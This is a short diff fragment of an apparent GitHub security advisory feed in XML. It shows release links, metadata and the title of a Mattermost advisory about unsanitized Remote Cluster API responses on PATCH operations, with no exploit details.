-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v10.11.16">https://github.com/mattermost/mattermost/releases/tag/v10.11.16</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.5.5">https://github.com/mattermost/mattermost/releases/tag/v11.5.5</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.6.2">https://github.com/mattermost/mattermost/releases/tag/v11.6.2</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.7.0">https://github.com/mattermost/mattermost/releases/tag/v11.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-9p44-r552-4wp9">https://github.com/advisories/GHSA-9p44-r552-4wp9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9p44-r552-4wp9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-12T18:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost doesn't sanitize the Remote Cluster API response on PATCH operations]]></title>
         <id>https://github.com/advisories/GHSA-9p44-r552-4wp9</id>
         <link href="https://github.com/advisories/GHSA-9p44-r552-4wp9"/>
         <updated>2026-08-24T21:48:39.000Z</updated>
